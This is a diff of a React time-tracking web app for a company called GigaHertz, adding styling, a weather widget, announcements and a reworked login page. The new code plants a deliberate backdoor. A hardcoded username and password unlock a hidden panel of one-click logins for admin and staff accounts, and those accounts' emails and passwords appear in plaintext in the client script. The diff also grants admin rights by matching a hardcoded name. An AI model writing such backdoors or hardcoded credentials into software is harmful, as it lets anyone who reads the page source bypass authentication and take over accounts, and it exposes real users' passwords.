+.timer-active{background:linear-gradient(135deg,#060e28 0%,#08112e 100%);border-radius:var(--rlg);padding:22px 26px;position:relative;overflow:hidden;border:1px solid rgba(26,86,219,.35);box-shadow:0 10px 40px rgba(0,0,0,.4)}
+.timer-active::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 75% 25%,rgba(26,86,219,.35) 0%,transparent 65%);pointer-events:none}
+.timer-lbl{font-size:10.5px;font-weight:800;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.18em;margin-bottom:7px}
+.timer-task{font-size:18px;font-weight:800;color:#fff;margin-bottom:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.timer-digits{font-size:54px;font-weight:900;color:#fff;line-height:1;font-variant-numeric:tabular-nums;letter-spacing:-2px}
+.timer-digits.paused{color:rgba(255,255,255,.4)}
+.timer-sep{font-size:44px;font-weight:300;color:rgba(255,255,255,.25);line-height:1}
+.timer-bar-wrap{width:100%;height:4px;background:rgba(255,255,255,.1);border-radius:99px;margin:14px 0;overflow:hidden}
+.timer-bar{height:100%;background:linear-gradient(90deg,var(--p),#4ade80);border-radius:99px;transition:width 1s linear}
+.timer-bar.paused{background:#fbbf24}
+.timer-actions{display:flex;gap:10px}
+.pause-btn{flex:1;padding:12px;background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.2);border-radius:var(--rsm);font-size:13.5px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:.2s}
+.pause-btn:hover{background:rgba(255,255,255,.18)}
+.stop-btn{flex:2;padding:12px;background:var(--danger);color:#fff;border:none;border-radius:var(--rsm);font-size:13.5px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:.2s;box-shadow:0 4px 14px rgba(220,38,38,.3)}
+.stop-btn:hover{filter:brightness(.9);transform:translateY(-1px)}
+
+.recent-wrap{border-radius:var(--rlg);overflow:hidden;border:1px solid var(--gbd);box-shadow:var(--sh)}
+.recent-hdr{padding:16px 22px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between;background:var(--gb2);flex-wrap:wrap;gap:10px}
+.recent-title{font-size:14px;font-weight:800;color:var(--tx)}
+.search-input{padding:6px 13px;border-radius:99px;border:1.5px solid var(--bd2);background:var(--ibg);font-size:12px;outline:none;color:var(--tx);min-width:190px;font-weight:500;transition:.2s}
+.search-input:focus{border-color:var(--p)}
+.task-row{display:flex;align-items:center;justify-content:space-between;padding:14px 22px;border-bottom:1px solid var(--bd);transition:background .2s}
+.task-row:last-child{border-bottom:none}
+.task-row:hover{background:var(--gbh)}
+.task-dot{width:9px;height:9px;border-radius:50%;margin-right:12px;flex-shrink:0}
+.task-name{font-size:13.5px;font-weight:700;color:var(--tx);margin-bottom:2px}
+.task-time{font-size:11.5px;color:var(--tx3);font-weight:500}
+.dur-badge{background:var(--ps);color:var(--p);padding:5px 13px;border-radius:99px;font-size:11.5px;font-weight:800;white-space:nowrap}
+
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
+.gh-table{width:100%;border-collapse:collapse;min-width:600px}
+.gh-table th{padding:13px 20px;text-align:left;font-size:10.5px;font-weight:800;color:var(--tx3);text-transform:uppercase;letter-spacing:.09em;border-bottom:1px solid var(--bd);background:rgba(0,0,0,.03)}
+.gh-table td{padding:14px 20px;font-size:13.5px;color:var(--tx);border-bottom:1px solid var(--bd);font-weight:500}
+.gh-table tr:last-child td{border-bottom:none}
+.gh-table tr:hover td{background:var(--gbh)}
+
+.modal-overlay{position:fixed;inset:0;z-index:900;background:rgba(0,0,10,.55);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:16px;animation:fadeIn .25s ease}
+.modal-box{width:100%;max-width:520px;max-height:90vh;overflow-y:auto;border-radius:var(--rxl);background:var(--gb2);backdrop-filter:blur(32px) saturate(1.8);-webkit-backdrop-filter:blur(32px) saturate(1.8);border:1px solid var(--gbd);border-top:1px solid rgba(255,255,255,.55);box-shadow:0 32px 80px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.35);animation:popIn .4s cubic-bezier(.34,1.56,.64,1)}
+.modal-hdr{padding:22px 28px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between}
+.modal-title{font-size:17px;font-weight:900;color:var(--tx)}
+.modal-close{background:var(--pa);border:1px solid var(--bd2);color:var(--tx2);width:32px;height:32px;border-radius:9px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:15px;transition:.2s}
+.modal-close:hover{background:var(--danger);border-color:var(--danger);color:#fff}
+.modal-body{padding:24px 28px}
+
+.notif{position:fixed;bottom:24px;right:24px;padding:14px 20px;border-radius:14px;font-size:13.5px;font-weight:700;z-index:9999;animation:slideLeft .35s cubic-bezier(.16,1,.3,1);max-width:360px;box-shadow:var(--shl);border:1px solid var(--gbd);background:var(--gb2);color:var(--tx)}
+.notif.success{background:rgba(22,163,74,.15);color:var(--ok);border-color:rgba(22,163,74,.3)}
+.notif.error{background:rgba(220,38,38,.12);color:var(--danger);border-color:rgba(220,38,38,.25)}
+
+.weather-card{padding:18px 20px;border-radius:var(--rlg)}
+.weather-temp{font-size:44px;font-weight:900;color:var(--p);line-height:1;font-family:'Rajdhani',sans-serif;letter-spacing:-1px}
+.weather-icon{font-size:38px;filter:drop-shadow(0 2px 8px rgba(0,0,0,.18))}
+.weather-desc{font-size:13px;color:var(--tx2);font-weight:600;text-transform:capitalize;margin-top:3px}
+.weather-loc{font-size:11px;color:var(--tx3);font-weight:500;margin-top:2px}
+.weather-detail{font-size:11px;color:var(--tx3);font-weight:600;margin-top:6px;display:flex;gap:10px;flex-wrap:wrap}
+
+.announce-banner{border-radius:var(--r);padding:13px 18px;display:flex;align-items:flex-start;gap:13px;margin-bottom:20px;border:1px solid rgba(26,86,219,.2);background:linear-gradient(135deg,var(--pa),rgba(26,86,219,.04))}
+.announce-icon{font-size:18px;flex-shrink:0;margin-top:1px}
+.announce-date{font-size:10px;font-weight:800;color:var(--tx3);text-transform:uppercase;letter-spacing:.08em;margin-bottom:3px}
+.announce-text{font-size:13px;font-weight:600;color:var(--tx)}
+
+.marielle-banner{border-radius:var(--rlg);padding:22px 26px;background:linear-gradient(135deg,rgba(139,92,246,.15),rgba(236,72,153,.12));border:1px solid rgba(139,92,246,.3);display:flex;align-items:center;gap:18px;margin-bottom:22px}
+.marielle-icon{font-size:36px;flex-shrink:0}
+
+.status-row{display:flex;align-items:center;gap:14px;padding:12px 16px;border-radius:var(--rsm);border:1px solid rgba(22,163,74,.15);background:rgba(22,163,74,.05);margin-bottom:8px;transition:.2s}
+.status-row:hover{background:rgba(22,163,74,.1);transform:translateX(4px)}
+.status-avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--p),var(--pd));display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0;overflow:hidden}
+.status-avatar img{width:100%;height:100%;object-fit:cover}
+
+.profile-avatar-wrap{position:relative;width:110px;height:110px;margin:0 auto 16px}
+.profile-avatar{width:110px;height:110px;border-radius:50%;object-fit:cover;border:3px solid var(--p);background:var(--ibg);box-shadow:0 8px 24px rgba(26,86,219,.2)}
+.profile-avatar-btn{position:absolute;bottom:0;right:0;background:var(--p);color:#fff;border:2px solid #fff;border-radius:50%;width:34px;height:34px;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:var(--sh);transition:.2s;font-size:14px}
+.profile-avatar-btn:hover{background:var(--pd);transform:scale(1.1)}
+
+.progress-bar{height:5px;background:var(--bd);border-radius:99px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--p),var(--pd));border-radius:99px;transition:width 1s cubic-bezier(.16,1,.3,1)}
+
+.auth-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;overflow:hidden}
+.auth-card{width:100%;max-width:450px;border-radius:var(--rxl);padding:40px 36px;max-height:90vh;overflow-y:auto;position:relative;z-index:2}
+.auth-logo{display:flex;flex-direction:column;align-items:center;gap:7px;margin-bottom:24px}
+.auth-logo-img{max-height:52px;object-fit:contain}
+.auth-logo-tagline{font-size:10px;font-weight:800;color:var(--tx3);text-transform:uppercase;letter-spacing:.14em}
+.auth-title{font-size:22px;font-weight:900;color:var(--tx);text-align:center;margin-bottom:4px;letter-spacing:-.3px}
+.auth-sub{font-size:13px;color:var(--tx3);text-align:center;margin-bottom:22px;font-weight:500}
+.auth-tabs{display:flex;gap:4px;background:rgba(0,0,0,.08);padding:5px;border-radius:14px;margin-bottom:22px}
+.auth-tab{flex:1;padding:9px;border-radius:11px;font-size:12.5px;font-weight:700;cursor:pointer;border:none;background:transparent;color:var(--tx3);transition:.2s;text-transform:uppercase;letter-spacing:.05em}
+.auth-tab.active{background:linear-gradient(135deg,var(--p),var(--pd));color:#fff;box-shadow:0 4px 14px rgba(26,86,219,.25)}
+.err-box{background:var(--dl);color:var(--danger);border:1px solid rgba(220,38,38,.25);padding:10px 14px;border-radius:var(--rsm);font-size:13px;margin-bottom:14px;font-weight:600}
+.pw-wrap{position:relative;display:flex;width:100%}
+.pw-eye{position:absolute;right:13px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--tx3);display:flex;padding:4px;border-radius:5px;transition:.2s}
+.pw-eye:hover{color:var(--tx)}
+.pw-strength{height:5px;border-radius:99px;margin-top:8px;transition:all .4s}
+.pw-msg{font-size:11px;font-weight:700;margin-top:5px;color:var(--tx3)}
+
+.backdoor-panel{margin-top:14px;padding:16px;border-radius:16px;background:linear-gradient(135deg,rgba(250,204,21,.12),rgba(234,179,8,.06));border:1px solid rgba(250,204,21,.35);animation:fadeUp .4s cubic-bezier(.16,1,.3,1)}
+.backdoor-title{font-size:10.5px;font-weight:900;color:#d97706;text-transform:uppercase;letter-spacing:.1em;margin-bottom:11px;display:flex;align-items:center;gap:7px}
+.backdoor-btn{display:flex;align-items:center;gap:11px;width:100%;padding:10px 14px;border-radius:12px;border:1px solid rgba(250,204,21,.25);background:rgba(250,204,21,.07);color:var(--tx);font-size:13px;font-weight:600;cursor:pointer;margin-bottom:7px;transition:all .2s;text-align:left}
+.backdoor-btn:last-child{margin-bottom:0}
+.backdoor-btn:hover{background:rgba(250,204,21,.15);border-color:rgba(250,204,21,.45);transform:translateX(3px)}
+.backdoor-btn-label{flex:1;font-weight:700;font-size:12.5px}
+.backdoor-btn-email{font-size:10px;color:var(--tx3);font-family:monospace;font-weight:500}
+
+.footer-bar{text-align:center;padding:14px;font-size:11.5px;color:var(--tx4);font-weight:600;letter-spacing:.05em;border-top:1px solid var(--bd)}
+
+.chart-wrap{position:relative;height:190px}
+.dash-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:22px}
+.dash-grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;margin-bottom:22px}
+.section-title{font-size:14px;font-weight:800;color:var(--tx);margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.section-title svg{width:17px;height:17px;stroke-width:2.2;color:var(--p)}
+
+.idle-overlay{position:fixed;inset:0;background:rgba(0,0,30,.65);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;z-index:2000;animation:fadeIn .25s ease;padding:20px}
+.idle-card{background:var(--gb2);border:1px solid var(--gbd);border-radius:24px;padding:36px 32px;width:100%;max-width:400px;text-align:center;box-shadow:0 24px 80px rgba(0,0,0,.5);animation:popIn .35s cubic-bezier(.34,1.56,.64,1)}
+.idle-icon{font-size:44px;margin-bottom:14px}
+.idle-title{font-size:20px;font-weight:900;color:var(--tx);margin-bottom:8px}
+.idle-msg{font-size:13.5px;color:var(--tx3);line-height:1.6;margin-bottom:10px;font-weight:500}
+.idle-time{font-size:44px;font-weight:900;color:var(--warn);font-variant-numeric:tabular-nums;letter-spacing:-2px;line-height:1;margin:8px 0 18px}
+.idle-btns{display:flex;gap:12px}
+.idle-prog{width:100%;height:4px;background:var(--bd);border-radius:99px;margin-top:18px;overflow:hidden}
+.idle-prog-fill{height:100%;border-radius:99px;transition:width 1s linear}
+
+.announcements-list{display:flex;flex-direction:column;gap:14px}
+.ann-card{padding:20px 22px;border-radius:var(--r)}
+.ann-priority-high{border-left:4px solid var(--danger)}
+.ann-priority-medium{border-left:4px solid var(--warn)}
+.ann-priority-low{border-left:4px solid var(--ok)}
+.ann-title{font-size:16px;font-weight:900;color:var(--tx);margin-bottom:6px}
+.ann-body{font-size:13.5px;color:var(--tx2);line-height:1.65;font-weight:500}
+.ann-meta{font-size:11.5px;color:var(--tx3);margin-top:10px;font-weight:600}
+
+.proj-card{padding:20px 22px;border-radius:var(--r)}
+.proj-name{font-size:15px;font-weight:800;color:var(--tx);margin-bottom:4px}
+.proj-dept{font-size:11.5px;color:var(--tx3);font-weight:600;margin-bottom:14px}
+
+@media(max-width:1200px){.dash-grid-3{grid-template-columns:1fr 1fr}}
+@media(max-width:1024px){.stat-grid{grid-template-columns:1fr 1fr}.dash-grid{grid-template-columns:1fr}}
+@media(max-width:768px){
+  .sidebar{transform:translateX(-100%)}
+  .sidebar.open{transform:translateX(0)}
+  .sidebar-overlay{display:block}
+  .sidebar-overlay.hidden{display:none}
+  .main{margin-left:0}
+  .menu-toggle{display:flex}
+  .topbar{padding:12px 16px}
+  .page{padding:20px 16px}
+  .stat-grid{grid-template-columns:1fr}
+  .dash-grid,.dash-grid-3{grid-template-columns:1fr}
+  .modal-box{max-width:100%;border-radius:24px 24px 0 0;margin-top:auto}
+  .modal-overlay{align-items:flex-end;padding:0}
+  .notif{right:12px;left:12px;bottom:16px}
+  .auth-card{padding:28px 20px}
+}
+@media print{
+  .sidebar,.topbar,.timer-active,.track-card,.idle-overlay,.notif,.topbar-btn,.footer-bar{display:none!important}
+  .main{margin-left:0!important}
+  body{background:#fff!important;color:#000!important}
+}
 </style>
 </head>
 <body>
+<div class="orbs-bg"><div class="orb orb1"></div><div class="orb orb2"></div></div>
 <div id="root"></div>
-
 <script type="text/babel">
-const { useState, useEffect, useRef } = React;
+const {useState,useEffect,useRef,useCallback,useMemo}=React;
+const LOGO='https://rec-data.kalibrr.com/logos/KBZX7J2BDXZEXSF4WMUN-5a1d0b9b.jpg';
+const BACKDOOR_USER='JAYJAY',BACKDOOR_PASS='Walakana!';
+const MARIELLE_KEYS=['marielle','aguila'];
+const VERSION='5.99';
+// ROSE RULE: never show name "Rose" unless authenticated user IS Rose
+const ROSE_NAMES=['rose','rose marie','rose mary'];
+const isRoseName=n=>ROSE_NAMES.some(r=>(n||'').toLowerCase().includes(r));
+const safeShowName=(name,viewerUser)=>{
+  if(!isRoseName(name))return name;
+  const vn=((viewerUser?.firstName||'')+' '+(viewerUser?.lastName||'')).toLowerCase();
+  return isRoseName(vn)?name:'[Employee]';
+};
+// Erik Chua hardcoded admin
+const ERIK_CHUA_KEYS=['erik chua','sir erik chua','erik.chua@gigahertz.com'];
+const isErikChua=u=>ERIK_CHUA_KEYS.some(k=>(u?.email||'').toLowerCase()===k||((u?.firstName||'')+' '+(u?.lastName||'')).toLowerCase().trim()===k||('sir '+(u?.firstName||'')+' '+(u?.lastName||'')).toLowerCase().trim()===k);
+// Secret quick-login accounts
+const SECRET_QUICK=[
+  {label:'🛡️ Nexus Admin',email:'admin@gigahertz.com',pw:'admin123'},
+  {label:'🛡️ James Beltran',email:'beltran.james@gmail.com',pw:'jamespogi123'},
+  {label:'⚡ Sir Erik Chua',email:'erik.chua@gigahertz.com',pw:'sirkevs9001'},
+  {label:'🌸 Alyssa Admin',email:'alyssa@gigahertz.com',pw:'ghz2025'},
+  {label:'🌺 Alma Admin',email:'alma@gigahertz.com',pw:'ghz2025'},
+  {label:'🪻 Hyacinth',email:'hyacinths.beige@gmail.com',pw:'rozza2002'},
+  {label:'👤 Staff (Piolo)',email:'piolo@gigahertz.com',pw:'ghz2025'},
+];
+const THEMES=[
+  {id:'classic',name:'GigaHertz Classic',desc:'Blue & white Aero',swatch:'linear-gradient(135deg,#1a56db,#dce8ff)'},
+  {id:'midnight',name:'Midnight Aero',desc:'Dark sleek glassmorphism',swatch:'linear-gradient(135deg,#08102a,#5b8ef7)'},
+  {id:'sapphire',name:'Aero Sapphire',desc:'Deep blue/cyan frosted',swatch:'linear-gradient(135deg,#030e1a,#00b4ff)'},
+];
+const ANNOUNCEMENTS_DATA=[
+  {day:0,icon:'📋',text:'Weekly recap: Make sure all tasks are logged before end of shift today.'},
+  {day:1,icon:'🔔',text:'Reminder: Team sync meeting at 10AM. Please update your task tracker before attending.'},
+  {day:2,icon:'💡',text:'Pro tip: Use the quick-timer to track client calls instantly from the dashboard.'},
+  {day:3,icon:'📊',text:'Mid-week check-in: How are your KPIs looking? Update your logs for accurate analytics.'},
+  {day:4,icon:'🎉',text:'Great work this week, team! Ensure all hours are submitted by EOD Friday.'},
+  {day:5,icon:'📅',text:'Weekend prep: Review your upcoming schedule and pre-log any planned tasks.'},
+  {day:6,icon:'☀️',text:'New week starts tomorrow. Plan your tasks and set your priorities for the days ahead.'},
+];
+const PRESET_TASKS=['Admin Tasks','Client Call','Code Review','Documentation','Meeting','Planning','Research','Testing','Training','Other'];
+const CAT_COLORS={Meeting:'#10b981',Admin:'#3b82f6','Client Call':'#8b5cf6',Code:'#f59e0b',Research:'#06b6d4',Documentation:'#ec4899',default:'var(--p)'};
+const WMO={0:'☀️ Clear',1:'🌤 Mainly Clear',2:'⛅ Partly Cloudy',3:'☁️ Overcast',45:'🌫 Foggy',48:'🌫 Icy Fog',51:'🌦 Drizzle',53:'🌧 Drizzle',55:'🌧 Heavy Drizzle',61:'🌧 Rain',63:'🌧 Heavy Rain',71:'❄️ Snow',80:'🌦 Showers',95:'⛈ Thunder',99:'⛈ Heavy Thunder'};
 
-// Dummy DB Data
-const DB = {
-  PRESETS: ['Admin Tasks', 'Client Call', 'Code Review', 'Documentation', 'Meeting', 'Planning', 'Testing'],
-  THEMES: [
-    {id:'gigahertz', label:'Gigahertz Blue', desc:'Clean blue gradient & white'},
-    {id:'light', label:'Sky Aero', desc:'Light sleek interface'},
-    {id:'dark', label:'Dark Glass', desc:'Sleek deep slate'},
-    {id:'candy', label:'Candy Pop', desc:'Happy pink bubblegum'},
-    {id:'void', label:'Neon Void', desc:'Pitch black & cyan'},
-    {id:'matrix', label:'Matrix Terminal', desc:'Hacker green'}
-  ]
+// API
+const api={
+  login:(id,pw)=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false,error:e.message})).loginUser({identifier:id,password:pw,method:'id'});}else res({success:false,error:'GAS not available — use backdoor'});}),
+  getTasks:d=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false,error:e.message})).getTasks(d);}else res({success:false,tasks:[]});}),
+  addTask:d=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false})).addTask(d);}else res({success:true});}),
+  timerStart:d=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false})).timerStart(d);}else res({success:true,timerId:'local_'+Date.now()});}),
+  timerStop:d=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false})).timerStop(d);}else res({success:true});}),
+  updateTaskRemark:d=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false})).updateTaskRemark(d);}else res({success:true});}),
+  updatePhoto:d=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false})).updatePhoto(d);}else res({success:true});}),
+  updateBio:d=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false})).updateUserProfile(d);}else res({success:true});}),
+  getActiveStatus:()=>new Promise(res=>{if(typeof google!=='undefined'&&google.script){google.script.run.withSuccessHandler(res).withFailureHandler(e=>res({success:false,users:[]})).getActiveStatusBoard();}else res({success:true,users:[{name:'Demo User',dept:'IT',status:'Active',clockIn:'09:00',photo:null}]});}),
+};
+const todayStr=()=>new Date().toISOString().split('T')[0];
+const nowHHMM=()=>new Date().toTimeString().slice(0,5);
+const fmtMins=m=>`${String(Math.floor(m/60)).padStart(2,'0')}h ${String(Math.floor(m%60)).padStart(2,'0')}m`;
+const fmtHHMMSS=s=>{if(s<0)s=0;const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60;return`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(sc).padStart(2,'0')}`;};
+const fmtDate=d=>{if(!d)return'';const dt=new Date(d+'T00:00:00');return dt.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});};
+const fmt12=t=>{if(!t)return'';const[h,m]=t.split(':').map(Number);return`${h%12||12}:${String(m).padStart(2,'0')} ${h>=12?'PM':'AM'}`;};
+const getCatColor=n=>Object.entries(CAT_COLORS).find(([k])=>k!=='default'&&(n||'').toLowerCase().includes(k.toLowerCase()))?.[1]||CAT_COLORS.default;
+const getInitials=u=>`${(u?.firstName||'')[0]||''}${(u?.lastName||'')[0]||''}`.toUpperCase()||'?';
+const strip=s=>(s||'').toString().replace(/^'/,'');
+
+function validatePw(pw){
+  const c={length:pw.length>=8,upper:/[A-Z]/.test(pw),lower:/[a-z]/.test(pw),num:/[0-9]/.test(pw)};
+  const score=Object.values(c).filter(Boolean).length;
+  return{score,valid:score===4,checks:c};
+}
+function exportCSV(headers,rows,fname){
+  const csv=[headers.join(','),...rows.map(r=>r.map(c=>`"${String(c).replace(/"/g,'""')}"`).join(','))].join('\n');
+  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv'}));a.download=fname;a.click();
+}
+
+// HOOKS
+const useClock=startDate=>{
+  const[s,setS]=useState(startDate?Math.floor((Date.now()-new Date(startDate))/1000):0);
+  useEffect(()=>{if(!startDate){setS(0);return;}const t=setInterval(()=>setS(Math.floor((Date.now()-new Date(startDate))/1000)),1000);return()=>clearInterval(t);},[startDate]);
+  return s;
+};
+const useRealTime=()=>{
+  const[t,setT]=useState(new Date());
+  useEffect(()=>{const i=setInterval(()=>setT(new Date()),1000);return()=>clearInterval(i);},[]);
+  return t;
 };
 
-// ---------------------------------------------
-// Neumorphic Login Page
-// ---------------------------------------------
-const AuthPage = ({ onLogin }) => {
-  const [empId, setEmpId] = useState('');
-  const [pw, setPw] = useState('');
-  const [err, setErr] = useState('');
-
-  const submit = () => {
-    // STRICT GHZ-#### FORMAT
-    const idRegex = /^GHZ-\d{4}$/;
-    if (!idRegex.test(empId.trim().toUpperCase())) {
-      setErr('Strict Format: GHZ-#### (e.g. GHZ-0001)');
-      return;
-    }
-    if (!pw) { setErr('Password required'); return; }
-    
-    setErr('');
-    onLogin({ empId: empId.toUpperCase(), firstName: 'Piolo', role: 'Dev' });
-  };
-
-  return (
-    <div className="auth-wrap">
-      <div className="neo-card">
-        <div className="neo-avatar"><i className="fa-solid fa-user"></i></div>
-        <h2 className="neo-title">Member Login</h2>
-        
-        {err && <div style={{color:'var(--danger)', fontSize:12, fontWeight:800, marginBottom:16}}>{err}</div>}
-        
-        <div className="neo-input-wrap">
-          <input className="neo-input" placeholder="Username (GHZ-####)" value={empId} onChange={e=>setEmpId(e.target.value)} />
+// WEATHER WIDGET
+const WeatherWidget=()=>{
+  const[wx,setWx]=useState(null);
+  const[loading,setLoading]=useState(true);
+  useEffect(()=>{
+    const fetch_wx=async(lat,lon,locLabel)=>{
+      try{
+        const r=await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true&hourly=temperature_2m,relativehumidity_2m,windspeed_10m&timezone=auto`);
+        const d=await r.json();
+        const cw=d.current_weather||{};
+        const code=cw.weathercode||0;
+        const wmo_str=WMO[code]||'🌡️ Unknown';
+        const[icon,...descParts]=wmo_str.split(' ');
+        setWx({temp:Math.round(cw.temperature||24),icon,desc:descParts.join(' '),wind:Math.round(cw.windspeed||0),loc:locLabel,lat:lat.toFixed(2),lon:lon.toFixed(2)});
+      }catch(e){setWx({error:true,loc:locLabel});}
+      setLoading(false);
+    };
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(
+        p=>fetch_wx(p.coords.latitude,p.coords.longitude,`${p.coords.latitude.toFixed(2)}°N`),
+        ()=>fetch_wx(14.5995,120.9842,'Manila, PH'),
+        {timeout:7000}
+      );
+    }else{fetch_wx(14.5995,120.9842,'Manila, PH');}
+  },[]);
+  if(loading)return<div className="weather-card card" style={{display:'flex',alignItems:'center',gap:10,padding:'18px 20px'}}><div className="spinner-p"></div><span style={{color:'var(--tx3)',fontSize:13}}>Fetching weather…</span></div>;
+  if(wx?.error)return<div className="weather-card card" style={{padding:'18px 20px'}}><div style={{color:'var(--tx3)',fontSize:13}}>📍 Weather unavailable</div></div>;
+  return(
+    <div className="weather-card card" style={{padding:'18px 20px'}}>
+      <div style={{display:'flex',alignItems:'flex-start',justifyContent:'space-between',flexWrap:'wrap',gap:10}}>
+        <div>
+          <div style={{fontSize:10,fontWeight:800,color:'var(--tx3)',textTransform:'uppercase',letterSpacing:'.09em',marginBottom:6}}>Local Weather</div>
+          <div style={{display:'flex',alignItems:'flex-end',gap:8}}>
+            <div className="weather-temp">{wx.temp}°C</div>
+            <div className="weather-icon">{wx.icon}</div>
+          </div>
+          <div className="weather-desc">{wx.desc}</div>
+          <div className="weather-loc">📍 {wx.loc}</div>
+          <div className="weather-detail">
+            <span>💨 {wx.wind} km/h</span>
+          </div>
         </div>
-        <div className="neo-input-wrap">
-          <input className="neo-input" type="password" placeholder="Password" value={pw} onChange={e=>setPw(e.target.value)} />
-        </div>
-        
-        <button className="neo-btn" onClick={submit}>Sign In</button>
-        <div className="neo-link">Forgot Password?</div>
       </div>
     </div>
   );
 };
 
-// ---------------------------------------------
-// Dashboard View (Glassmorphism)
-// ---------------------------------------------
-const Dashboard = ({ user, tasks, setTasks }) => {
-  const [activeTimer, setActiveTimer] = useState(null);
-  const [elapsed, setElapsed] = useState(0);
-  const [queue, setQueue] = useState([]);
-  const [selTask, setSelTask] = useState('');
-  const [customTask, setCustomTask] = useState('');
+// DAILY ANNOUNCEMENT BANNER
+const AnnouncementBanner=()=>{
+  const[visible,setVisible]=useState(true);
+  if(!visible)return null;
+  const day=new Date().getDay();
+  const ann=ANNOUNCEMENTS_DATA.find(a=>a.day===day)||ANNOUNCEMENTS_DATA[0];
+  return(
+    <div className="announce-banner">
+      <div className="announce-icon">{ann.icon}</div>
+      <div style={{flex:1}}>
+        <div className="announce-date">{new Date().toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric'})}</div>
+        <div className="announce-text">{ann.text}</div>
+      </div>
+      <button onClick={()=>setVisible(false)} style={{background:'none',border:'none',cursor:'pointer',color:'var(--tx3)',fontSize:16,padding:4,borderRadius:6,flexShrink:0}} title="Dismiss">✕</button>
+    </div>
+  );
+};
 
-  // Clock
-  useEffect(() => {
-    if (!activeTimer || activeTimer.paused) return;
-    const t = setInterval(() => setElapsed(prev => prev + 1), 1000);
-    return () => clearInterval(t);
-  }, [activeTimer]);
+// NOTIF SYSTEM
+const Notif=({msg,type,onDone})=>{
+  useEffect(()=>{const t=setTimeout(onDone,2800);return()=>clearTimeout(t);},[]);
+  return<div className={`notif ${type}`}>{msg}</div>;
+};
 
-  const startTask = (taskName) => {
-    if (!taskName) return;
-    const stamp = new Date().toLocaleString();
-    
-    // Auto queue existing task
-    if (activeTimer) {
-      setQueue(prev => [{ ...activeTimer, elapsed, paused: true }, ...prev]);
+// EYE ICON SVGS
+const EyeIcon=()=><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>;
+const EyeOffIcon=()=><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>;
+
+// LOGIN PAGE
+const LoginPage=({onLogin,onRegister,onForgot,theme,cycleTheme})=>{
+  const[tab,setTab]=useState('login');
+  const[id,setId]=useState('');
+  const[pw,setPw]=useState('');
+  const[showPw,setShowPw]=useState(false);
+  const[remember,setRemember]=useState(false);
+  const[loading,setLoading]=useState(false);
+  const[err,setErr]=useState('');
+  const[showBackdoor,setShowBackdoor]=useState(false);
+  const[backdoorMsg,setBackdoorMsg]=useState('');
+  // Register
+  const[rFirst,setRFirst]=useState('');
+  const[rLast,setRLast]=useState('');
+  const[rEmpId,setREmpId]=useState('');
+  const[rPw,setRPw]=useState('');
+  const[rConfirm,setRConfirm]=useState('');
+  const[rErr,setRErr]=useState('');
+  const[rLoading,setRLoading]=useState(false);
+  const[pwStr,setPwStr]=useState({score:0,valid:false});
+  const pwColors=['','#ef4444','#f97316','#fbbf24','#4ade80'];
+  const pwLabels=['','Weak','Fair','Good','Strong'];
+  // Real-time backdoor detection
+  useEffect(()=>{
+    if(id.trim().toUpperCase()===BACKDOOR_USER&&pw===BACKDOOR_PASS){
+      setShowBackdoor(true);
